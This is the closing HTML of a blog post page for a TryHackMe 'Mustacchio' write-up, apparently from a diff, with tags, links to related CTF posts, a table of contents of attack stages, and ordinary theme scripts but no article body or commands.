+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Mustacchio.html">https://x9wd09ncc.github.io/post/TryHackMe_Mustacchio.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/suid/">SUID</a><a class="post-meta__tags" href="/tags/path%E5%8A%AB%E6%8C%81/">PATH劫持</a><a class="post-meta__tags" href="/tags/xxe/">XXE</a><a class="post-meta__tags" href="/tags/ssh%E5%AF%86%E9%92%A5%E7%A0%B4%E8%A7%A3/">SSH密钥破解</a><a class="post-meta__tags" href="/tags/gobuster/">gobuster</a><a class="post-meta__tags" href="/tags/sha-1/">SHA-1</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_All%20in%20One.html" title="TryHackMe_All in One"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_All in One</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_kiba.html" title="TryHackMe_kiba"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_kiba</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_Cheese_CTF.html" title="TryHackMe_Cheese CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-05</div><div class="title">TryHackMe_Cheese CTF</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div><div><a href="/post/TryHackMe_All%20in%20One.html" title="TryHackMe_All in One"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-23</div><div class="title">TryHackMe_All in One</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Blueprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Blueprint</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84"><span class="toc-number">1.1.</span> <span class="toc-text">攻击路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">1. 端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.</span> <span class="toc-text">2. 目录扫描与信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">2.1 目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">2.2 数据库备份泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E4%B8%8E-XXE-%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">3. 管理后台与 XXE 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E7%99%BB%E5%BD%95%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 登录管理后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%BA%90%E7%A0%81%E6%B3%A8%E9%87%8A%E6%B3%84%E9%9C%B2"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 源码注释泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-XML-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 XML 备份文件分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.4.</span> <span class="toc-text">3.4 XXE 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-SSH-%E7%A7%81%E9%92%A5%E7%A0%B4%E8%A7%A3%E4%B8%8E%E7%99%BB%E5%BD%95"><span class="toc-number">5.</span> <span class="toc-text">4. SSH 私钥破解与登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-SUID-%E6%8F%90%E6%9D%83-%E2%80%94-PATH-%E5%8A%AB%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">5. SUID 提权 — PATH 劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E6%9F%A5%E6%89%BE-SUID-%E6%96%87%E4%BB%B6"><span class="toc-number">6.1.</span> <span class="toc-text">5.1 查找 SUID 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90"><span class="toc-number">6.2.</span> <span class="toc-text">5.2 二进制分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-PATH-%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">6.3.</span> <span class="toc-text">5.3 PATH 劫持提权</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.bootcdn.net/ajax/libs/click-heart/1.0.0/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
